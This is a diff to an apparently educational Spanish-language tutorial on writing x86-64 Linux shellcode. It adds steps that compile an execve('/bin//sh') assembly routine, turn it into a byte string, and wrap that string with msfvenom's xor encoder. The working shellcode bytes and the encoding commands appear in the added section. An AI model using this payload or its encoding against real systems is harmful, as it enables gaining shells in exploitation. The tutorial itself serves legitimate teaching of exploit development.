@@ -30,6 +30,7 @@ Lo que haremos es meter esos argumentos en la memoria (rsp) y luego pasarlo de a
 Para pasar el "/bin//bash", hay que pasarlo a hexadecimal. Eso se puede hacer facilmente con Python:
 `"0x" + "/bin//sh"[::-1].encode("utf-8").hex() -> 0x68732f2f6e69622f `
 
+Codigo en assembly:
 ```asm
 global _start 
 section .text
@@ -50,12 +51,13 @@ _start:
     add rax, 59 ;       Llamamos a execve
     syscall  ; lo ejecutamos
 ```
-Para que entendamos como está puesto todo
-- La pila
-| rsp | 0x7fffffffdea0  | 0x7fffffffdea8  | 0x7fffffffdeb0 |  0x7fffffffdeb8 |
-| --- | ------------- | -------------- | ------------- | -------------- |
+Para que entendamos como está puesto todo:  
+- La pila  
+```
+| rsp   |    0x7fffffffdea0  | 0x7fffffffdea8     | 0x7fffffffdeb0               |    0x7fffffffdeb8 |
+| ---   | ------------------ | ------------------ | ---------------------------- | ----------------- |
 | valor | 0x00007fffffffdeb0 |  0x000000000000000 | 0x68732f2f6e69622f (/bin//sh)| 0x000000000000000 | 
-
+```
 - Los registros:
 ```
   ; $rdi   : 0x007fffffffdeb0  →  "/bin//sh",0x0
@@ -63,4 +65,23 @@ Para que entendamos como está puesto todo
   ; $rdx   : 0x007fffffffdea8  →  0x0000000000000000
 ```
 
+------------------
+
+Compilamos esto a un objeto y lo pasamos a una cadena de bytes.
+```bash
+└─$ nasm -f elf64 execv.asm -o execv.o
+└─$ ld execv.o -o execv
+└─$ ./execv
+$ whoami
+cucuxii
+```
+
+```bash
+└─$ for i in $(objdump -d execv.o -M intel | grep "^ " | cut -f2); do echo -n "\\\x$i"; done                  
+\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05
+└─$ echo -ne "\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05" | msfvenom -f elf -e x64/xor -a x64 --platform linux > demo
+└─$ ./demo
+$ whoami
+cucuxii
+```
 
